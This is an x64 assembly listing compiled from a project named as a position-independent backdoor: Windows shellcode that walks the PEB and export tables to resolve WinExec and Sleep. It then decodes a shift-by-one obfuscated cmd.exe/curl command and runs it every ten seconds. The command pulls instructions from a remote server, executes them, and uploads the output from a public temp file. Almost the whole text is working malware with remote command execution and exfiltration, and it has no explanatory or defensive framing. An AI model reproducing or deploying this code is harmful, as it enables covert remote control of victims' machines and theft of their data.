; Listing generated by Microsoft (R) Optimizing Compiler Version 19.29.30140.0 

include listing.inc

; INCLUDELIB LIBCMT
; INCLUDELIB OLDNAMES

PUBLIC	?get_module_by_name@@YAPEAXPEA_W@Z		; get_module_by_name
PUBLIC	?get_func_by_name@@YAPEAXPEAXPEAD@Z		; get_func_by_name
PUBLIC	?rot1@@YAXPEAD_K_N@Z				; rot1
PUBLIC	main
;	COMDAT pdata
;	COMDAT pdata
;	COMDAT xdata
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	014H
voltbl	ENDS
;	COMDAT xdata
; Function compile flags: /Odtp
PUBLIC  AlignRSP
_TEXT SEGMENT
	; AlignRSP - by @mattifestation (http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html)
	; AlignRSP is a simple call stub that ensures that the stack is 16 - byte aligned prior
	; to calling the entry point of the payload.This is necessary because 64 - bit functions
	; in Windows assume that they were called with 16 - byte stack alignment.When amd64
	; shellcode is executed, you can't be assured that you stack is 16-byte aligned. For example,
	; if your shellcode lands with 8 - byte stack alignment, any call to a Win32 function will likely
	; crash upon calling any ASM instruction that utilizes XMM registers(which require 16 - byte)
	; alignment.

	AlignRSP PROC
	push rsi; Preserve RSI since we're stomping on it
	mov  rsi, rsp; Save the value of RSP so it can be restored
	and  rsp, 0FFFFFFFFFFFFFFF0h; Align RSP to 16 bytes
	sub  rsp, 020h; Allocate homing space for ExecutePayload
	call main; Call the entry point of the payload
	mov  rsp, rsi; Restore the original value of RSP
	pop  rsi; Restore RSI
	ret; Return to caller
	AlignRSP ENDP
_TEXT ENDS

_TEXT	SEGMENT
base$ = 32
kernel32_dll_name$ = 40
load_lib$ = 72
get_proc$ = 80
_GetProcAddress$ = 88
_WinExec$ = 96
_Sleep$ = 104
return_val$1 = 112
_LoadLibraryA$ = 120
cmd$ = 128
main	PROC
; File C:\Users\Shayan Jadoon\source\repos\Position_Independent_Backdoor\Position_Independent_Backdoor\backdoor.cpp
; Line 22
$LN10:
	push	rsi
	push	rdi
	sub	rsp, 392				; 00000188H
; Line 24
	mov	eax, 107				; 0000006bH
	mov	WORD PTR kernel32_dll_name$[rsp], ax
	mov	eax, 101				; 00000065H
	mov	WORD PTR kernel32_dll_name$[rsp+2], ax
	mov	eax, 114				; 00000072H
	mov	WORD PTR kernel32_dll_name$[rsp+4], ax
	mov	eax, 110				; 0000006eH
	mov	WORD PTR kernel32_dll_name$[rsp+6], ax
	mov	eax, 101				; 00000065H
	mov	WORD PTR kernel32_dll_name$[rsp+8], ax
	mov	eax, 108				; 0000006cH
	mov	WORD PTR kernel32_dll_name$[rsp+10], ax
	mov	eax, 51					; 00000033H
	mov	WORD PTR kernel32_dll_name$[rsp+12], ax
	mov	eax, 50					; 00000032H
	mov	WORD PTR kernel32_dll_name$[rsp+14], ax
	mov	eax, 46					; 0000002eH
	mov	WORD PTR kernel32_dll_name$[rsp+16], ax
	mov	eax, 100				; 00000064H
	mov	WORD PTR kernel32_dll_name$[rsp+18], ax
	mov	eax, 108				; 0000006cH
	mov	WORD PTR kernel32_dll_name$[rsp+20], ax
	mov	eax, 108				; 0000006cH
	mov	WORD PTR kernel32_dll_name$[rsp+22], ax
	xor	eax, eax
	mov	WORD PTR kernel32_dll_name$[rsp+24], ax
; Line 30
	lea	rax, QWORD PTR cmd$[rsp]
	CALL after_$SG90909
$SG90909 DB	'dne/fyf!0d!#gps!0g!#efmjnt>#!&j!jo!)(dvsm!iuuqt;00s/cbbm'
	DB	'fkjcsffm/dpn0tibeez0ebub/qiq(*!ep!tfu!pvuqvu>&j!''''!&j!?!D;]'
	DB	'vtfst]qvcmjd]ufnq/uyu!''''!dvsm!..gpsn!#gjmfUpVqmpbe>AD;]vtfs'
	DB	't]qvcmjd]ufnq/uyu#!iuuqt;00s/cbbmfkjcsffm/dpn0tibeez0hfugjmf/'
	DB	'qiq#!', 00H
	ORG $+7
after_$SG90909:
	POP  rcx

; 	lea	rcx, OFFSET FLAT:$SG90909
	mov	rdi, rax
	mov	rsi, rcx
	mov	ecx, 241				; 000000f1H
	rep movsb
; Line 37
	lea	rcx, QWORD PTR kernel32_dll_name$[rsp]
	call	?get_module_by_name@@YAPEAXPEA_W@Z	; get_module_by_name
	mov	QWORD PTR base$[rsp], rax
; Line 38
	cmp	QWORD PTR base$[rsp], 0
	jne	SHORT $LN4@main
; Line 39
	mov	eax, 1
	jmp	$LN1@main
$LN4@main:
; Line 44
	CALL after_$SG90911
$SG90911 DB	'LoadLibraryA', 00H
	ORG $+3
after_$SG90911:
	POP  rdx

; 	lea	rdx, OFFSET FLAT:$SG90911
	mov	rcx, QWORD PTR base$[rsp]
	call	?get_func_by_name@@YAPEAXPEAXPEAD@Z	; get_func_by_name
	mov	QWORD PTR load_lib$[rsp], rax
; Line 46
	cmp	QWORD PTR load_lib$[rsp], 0
	jne	SHORT $LN5@main
; Line 47
	mov	eax, 2
	jmp	$LN1@main
$LN5@main:
; Line 52
	CALL after_$SG90913
$SG90913 DB	'GetProcAddress', 00H
	ORG $+1
after_$SG90913:
	POP  rdx

; 	lea	rdx, OFFSET FLAT:$SG90913
	mov	rcx, QWORD PTR base$[rsp]
	call	?get_func_by_name@@YAPEAXPEAXPEAD@Z	; get_func_by_name
	mov	QWORD PTR get_proc$[rsp], rax
; Line 54
	cmp	QWORD PTR get_proc$[rsp], 0
	jne	SHORT $LN6@main
; Line 55
	mov	eax, 3
	jmp	$LN1@main
$LN6@main:
; Line 59
	mov	rax, QWORD PTR load_lib$[rsp]
	mov	QWORD PTR _LoadLibraryA$[rsp], rax
; Line 61
	mov	rax, QWORD PTR get_proc$[rsp]
	mov	QWORD PTR _GetProcAddress$[rsp], rax
; Line 66
	CALL after_$SG90915
$SG90915 DB	'WinExec', 00H
after_$SG90915:
	POP  rdx

; 	lea	rdx, OFFSET FLAT:$SG90915
	mov	rcx, QWORD PTR base$[rsp]
	call	QWORD PTR _GetProcAddress$[rsp]
	mov	QWORD PTR _WinExec$[rsp], rax
; Line 70
	cmp	QWORD PTR _WinExec$[rsp], 0
	jne	SHORT $LN7@main
	mov	eax, 4
	jmp	SHORT $LN1@main
$LN7@main:
; Line 74
	CALL after_$SG90917
$SG90917 DB	'Sleep', 00H
after_$SG90917:
	POP  rdx

; 	lea	rdx, OFFSET FLAT:$SG90917
	mov	rcx, QWORD PTR base$[rsp]
	call	QWORD PTR _GetProcAddress$[rsp]
	mov	QWORD PTR _Sleep$[rsp], rax
; Line 77
	cmp	QWORD PTR _Sleep$[rsp], 0
	jne	SHORT $LN8@main
	mov	eax, 5
	jmp	SHORT $LN1@main
$LN8@main:
; Line 79
	mov	r8b, 1
	mov	edx, 241				; 000000f1H
	lea	rcx, QWORD PTR cmd$[rsp]
	call	?rot1@@YAXPEAD_K_N@Z			; rot1
$LN2@main:
; Line 80
	xor	eax, eax
	cmp	eax, 1
	je	SHORT $LN3@main
; Line 82
	xor	edx, edx
	lea	rcx, QWORD PTR cmd$[rsp]
	call	QWORD PTR _WinExec$[rsp]
	mov	DWORD PTR return_val$1[rsp], eax
; Line 83
	mov	ecx, 10000				; 00002710H
	call	QWORD PTR _Sleep$[rsp]
; Line 84
	jmp	SHORT $LN2@main
$LN3@main:
; Line 85
	xor	r8d, r8d
	mov	edx, 241				; 000000f1H
	lea	rcx, QWORD PTR cmd$[rsp]
	call	?rot1@@YAXPEAD_K_N@Z			; rot1
; Line 91
	xor	eax, eax
$LN1@main:
; Line 92
	add	rsp, 392				; 00000188H
	pop	rdi
	pop	rsi
	ret	0
main	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
i$1 = 0
str$ = 32
str_size$ = 40
decode$ = 48
?rot1@@YAXPEAD_K_N@Z PROC				; rot1
; File C:\Users\Shayan Jadoon\source\repos\Position_Independent_Backdoor\Position_Independent_Backdoor\backdoor.cpp
; Line 95
$LN8:
	mov	BYTE PTR [rsp+24], r8b
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 24
; Line 96
	mov	QWORD PTR i$1[rsp], 0
	jmp	SHORT $LN4@rot1
$LN2@rot1:
	mov	rax, QWORD PTR i$1[rsp]
	inc	rax
	mov	QWORD PTR i$1[rsp], rax
$LN4@rot1:
	mov	rax, QWORD PTR str_size$[rsp]
	dec	rax
	cmp	QWORD PTR i$1[rsp], rax
	jae	SHORT $LN3@rot1
; Line 97
	movzx	eax, BYTE PTR decode$[rsp]
	test	eax, eax
	je	SHORT $LN5@rot1
; Line 98
	mov	rax, QWORD PTR i$1[rsp]
	mov	rcx, QWORD PTR str$[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	dec	eax
	mov	rcx, QWORD PTR i$1[rsp]
	mov	rdx, QWORD PTR str$[rsp]
	add	rdx, rcx
	mov	rcx, rdx
	mov	BYTE PTR [rcx], al
; Line 99
	jmp	SHORT $LN6@rot1
$LN5@rot1:
; Line 101
	mov	rax, QWORD PTR i$1[rsp]
	mov	rcx, QWORD PTR str$[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	inc	eax
	mov	rcx, QWORD PTR i$1[rsp]
	mov	rdx, QWORD PTR str$[rsp]
	add	rdx, rcx
	mov	rcx, rdx
	mov	BYTE PTR [rcx], al
$LN6@rot1:
; Line 103
	jmp	SHORT $LN2@rot1
$LN3@rot1:
; Line 104
	add	rsp, 24
	ret	0
?rot1@@YAXPEAD_K_N@Z ENDP				; rot1
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ?get_func_by_name@@YAPEAXPEAXPEAD@Z
_TEXT	SEGMENT
k$1 = 0
i$2 = 8
exp$ = 16
expAddr$ = 24
funcNamesListRVA$ = 28
namesOrdsListRVA$ = 32
funcsListRVA$ = 36
curr_name$3 = 40
idh$ = 48
exportsDir$ = 56
nt_headers$ = 64
namesCount$ = 72
nameIndex$4 = 80
nameRVA$5 = 88
funcRVA$6 = 96
module$ = 128
func_name$ = 136
?get_func_by_name@@YAPEAXPEAXPEAD@Z PROC		; get_func_by_name, COMDAT
; File C:\Users\Shayan Jadoon\source\repos\Position_Independent_Backdoor\Position_Independent_Backdoor\peb_lookup.h
; Line 104
$LN13:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 120				; 00000078H
; Line 105
	mov	rax, QWORD PTR module$[rsp]
	mov	QWORD PTR idh$[rsp], rax
; Line 106
	mov	rax, QWORD PTR idh$[rsp]
	movzx	eax, WORD PTR [rax]
	cmp	eax, 23117				; 00005a4dH
	je	SHORT $LN8@get_func_b
; Line 107
	xor	eax, eax
	jmp	$LN1@get_func_b
$LN8@get_func_b:
; Line 109
	mov	rax, QWORD PTR idh$[rsp]
	movsxd	rax, DWORD PTR [rax+60]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR nt_headers$[rsp], rax
; Line 110
	mov	eax, 8
	imul	rax, rax, 0
	mov	rcx, QWORD PTR nt_headers$[rsp]
	lea	rax, QWORD PTR [rcx+rax+136]
	mov	QWORD PTR exportsDir$[rsp], rax
; Line 111
	mov	rax, QWORD PTR exportsDir$[rsp]
	cmp	DWORD PTR [rax], 0
	jne	SHORT $LN9@get_func_b
; Line 112
	xor	eax, eax
	jmp	$LN1@get_func_b
$LN9@get_func_b:
; Line 115
	mov	rax, QWORD PTR exportsDir$[rsp]
	mov	eax, DWORD PTR [rax]
	mov	DWORD PTR expAddr$[rsp], eax
; Line 116
	mov	eax, DWORD PTR expAddr$[rsp]
	add	rax, QWORD PTR module$[rsp]
	mov	QWORD PTR exp$[rsp], rax
; Line 117
	mov	rax, QWORD PTR exp$[rsp]
	mov	eax, DWORD PTR [rax+24]
	mov	QWORD PTR namesCount$[rsp], rax
; Line 119
	mov	rax, QWORD PTR exp$[rsp]
	mov	eax, DWORD PTR [rax+28]
	mov	DWORD PTR funcsListRVA$[rsp], eax
; Line 120
	mov	rax, QWORD PTR exp$[rsp]
	mov	eax, DWORD PTR [rax+32]
	mov	DWORD PTR funcNamesListRVA$[rsp], eax
; Line 121
	mov	rax, QWORD PTR exp$[rsp]
	mov	eax, DWORD PTR [rax+36]
	mov	DWORD PTR namesOrdsListRVA$[rsp], eax
; Line 124
	mov	QWORD PTR i$2[rsp], 0
	jmp	SHORT $LN4@get_func_b
$LN2@get_func_b:
	mov	rax, QWORD PTR i$2[rsp]
	inc	rax
	mov	QWORD PTR i$2[rsp], rax
$LN4@get_func_b:
	mov	rax, QWORD PTR namesCount$[rsp]
	cmp	QWORD PTR i$2[rsp], rax
	jae	$LN3@get_func_b
; Line 125
	mov	eax, DWORD PTR funcNamesListRVA$[rsp]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR i$2[rsp]
	lea	rax, QWORD PTR [rax+rcx*4]
	mov	QWORD PTR nameRVA$5[rsp], rax
; Line 126
	mov	eax, DWORD PTR namesOrdsListRVA$[rsp]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR i$2[rsp]
	lea	rax, QWORD PTR [rax+rcx*2]
	mov	QWORD PTR nameIndex$4[rsp], rax
; Line 127
	mov	eax, DWORD PTR funcsListRVA$[rsp]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR nameIndex$4[rsp]
	movzx	ecx, WORD PTR [rcx]
	lea	rax, QWORD PTR [rax+rcx*4]
	mov	QWORD PTR funcRVA$6[rsp], rax
; Line 129
	mov	rax, QWORD PTR nameRVA$5[rsp]
	mov	eax, DWORD PTR [rax]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR curr_name$3[rsp], rax
; Line 130
	mov	QWORD PTR k$1[rsp], 0
; Line 131
	mov	QWORD PTR k$1[rsp], 0
	jmp	SHORT $LN7@get_func_b
$LN5@get_func_b:
	mov	rax, QWORD PTR k$1[rsp]
	inc	rax
	mov	QWORD PTR k$1[rsp], rax
$LN7@get_func_b:
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR func_name$[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	test	eax, eax
	je	SHORT $LN6@get_func_b
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR curr_name$3[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	test	eax, eax
	je	SHORT $LN6@get_func_b
; Line 132
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR func_name$[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	mov	rcx, QWORD PTR k$1[rsp]
	mov	rdx, QWORD PTR curr_name$3[rsp]
	add	rdx, rcx
	mov	rcx, rdx
	movsx	ecx, BYTE PTR [rcx]
	cmp	eax, ecx
	je	SHORT $LN10@get_func_b
	jmp	SHORT $LN6@get_func_b
$LN10@get_func_b:
; Line 133
	jmp	SHORT $LN5@get_func_b
$LN6@get_func_b:
; Line 134
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR func_name$[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	test	eax, eax
	jne	SHORT $LN11@get_func_b
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR curr_name$3[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	test	eax, eax
	jne	SHORT $LN11@get_func_b
; Line 136
	mov	rax, QWORD PTR funcRVA$6[rsp]
	mov	eax, DWORD PTR [rax]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	jmp	SHORT $LN1@get_func_b
$LN11@get_func_b:
; Line 138
	jmp	$LN2@get_func_b
$LN3@get_func_b:
; Line 139
	xor	eax, eax
$LN1@get_func_b:
; Line 140
	add	rsp, 120				; 00000078H
	ret	0
?get_func_by_name@@YAPEAXPEAXPEAD@Z ENDP		; get_func_by_name
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ?get_module_by_name@@YAPEAXPEA_W@Z
_TEXT	SEGMENT
i$1 = 0
tv136 = 8
tv155 = 10
c1$2 = 12
c2$3 = 16
curr_name$4 = 24
curr_module$ = 32
tv132 = 40
tv151 = 44
peb$ = 48
ldr$ = 56
Flink$ = 64
list$ = 72
module_name$ = 128
?get_module_by_name@@YAPEAXPEA_W@Z PROC			; get_module_by_name, COMDAT
; File C:\Users\Shayan Jadoon\source\repos\Position_Independent_Backdoor\Position_Independent_Backdoor\peb_lookup.h
; Line 69
$LN16:
	mov	QWORD PTR [rsp+8], rcx
	push	rsi
	push	rdi
	sub	rsp, 104				; 00000068H
; Line 70
	mov	QWORD PTR peb$[rsp], 0
; Line 72
	mov	rax, QWORD PTR gs:[96]
	mov	QWORD PTR peb$[rsp], rax
; Line 76
	mov	rax, QWORD PTR peb$[rsp]
	mov	rax, QWORD PTR [rax+24]
	mov	QWORD PTR ldr$[rsp], rax
; Line 77
	lea	rax, QWORD PTR list$[rsp]
	mov	rcx, QWORD PTR ldr$[rsp]
	mov	rdi, rax
	lea	rsi, QWORD PTR [rcx+16]
	mov	ecx, 16
	rep movsb
; Line 79
	mov	rax, QWORD PTR list$[rsp]
	mov	QWORD PTR Flink$[rsp], rax
; Line 80
	mov	rax, QWORD PTR Flink$[rsp]
	mov	QWORD PTR curr_module$[rsp], rax
$LN15@get_module:
$LN2@get_module:
; Line 82
	cmp	QWORD PTR curr_module$[rsp], 0
	je	$LN3@get_module
	mov	rax, QWORD PTR curr_module$[rsp]
	cmp	QWORD PTR [rax+48], 0
	je	$LN3@get_module
; Line 83
	mov	rax, QWORD PTR curr_module$[rsp]
	cmp	QWORD PTR [rax+96], 0
	jne	SHORT $LN7@get_module
	jmp	SHORT $LN2@get_module
$LN7@get_module:
; Line 84
	mov	rax, QWORD PTR curr_module$[rsp]
	mov	rax, QWORD PTR [rax+96]
	mov	QWORD PTR curr_name$4[rsp], rax
; Line 86
	mov	QWORD PTR i$1[rsp], 0
; Line 87
	mov	QWORD PTR i$1[rsp], 0
	jmp	SHORT $LN6@get_module
$LN4@get_module:
	mov	rax, QWORD PTR i$1[rsp]
	inc	rax
	mov	QWORD PTR i$1[rsp], rax
$LN6@get_module:
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	test	eax, eax
	je	$LN5@get_module
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	test	eax, eax
	je	$LN5@get_module
; Line 89
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	cmp	eax, 90					; 0000005aH
	jg	SHORT $LN11@get_module
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	cmp	eax, 65					; 00000041H
	jl	SHORT $LN11@get_module
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	sub	eax, 65					; 00000041H
	add	eax, 97					; 00000061H
	mov	DWORD PTR tv132[rsp], eax
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	edx, WORD PTR tv132[rsp]
	mov	WORD PTR [rax+rcx*2], dx
	movzx	eax, WORD PTR tv132[rsp]
	mov	WORD PTR tv136[rsp], ax
	jmp	SHORT $LN12@get_module
$LN11@get_module:
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	mov	WORD PTR tv136[rsp], ax
$LN12@get_module:
	movzx	eax, WORD PTR tv136[rsp]
	mov	WORD PTR c1$2[rsp], ax
; Line 90
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	cmp	eax, 90					; 0000005aH
	jg	SHORT $LN13@get_module
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	cmp	eax, 65					; 00000041H
	jl	SHORT $LN13@get_module
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	sub	eax, 65					; 00000041H
	add	eax, 97					; 00000061H
	mov	DWORD PTR tv151[rsp], eax
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	edx, WORD PTR tv151[rsp]
	mov	WORD PTR [rax+rcx*2], dx
	movzx	eax, WORD PTR tv151[rsp]
	mov	WORD PTR tv155[rsp], ax
	jmp	SHORT $LN14@get_module
$LN13@get_module:
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	mov	WORD PTR tv155[rsp], ax
$LN14@get_module:
	movzx	eax, WORD PTR tv155[rsp]
	mov	WORD PTR c2$3[rsp], ax
; Line 91
	movzx	eax, WORD PTR c1$2[rsp]
	movzx	ecx, WORD PTR c2$3[rsp]
	cmp	eax, ecx
	je	SHORT $LN8@get_module
	jmp	SHORT $LN5@get_module
$LN8@get_module:
; Line 92
	jmp	$LN4@get_module
$LN5@get_module:
; Line 93
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	test	eax, eax
	jne	SHORT $LN9@get_module
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	test	eax, eax
	jne	SHORT $LN9@get_module
; Line 95
	mov	rax, QWORD PTR curr_module$[rsp]
	mov	rax, QWORD PTR [rax+48]
	jmp	SHORT $LN1@get_module
$LN9@get_module:
; Line 98
	mov	rax, QWORD PTR curr_module$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	QWORD PTR curr_module$[rsp], rax
; Line 99
	jmp	$LN15@get_module
$LN3@get_module:
; Line 100
	xor	eax, eax
$LN1@get_module:
; Line 101
	add	rsp, 104				; 00000068H
	pop	rdi
	pop	rsi
	ret	0
?get_module_by_name@@YAPEAXPEA_W@Z ENDP			; get_module_by_name
_TEXT	ENDS
END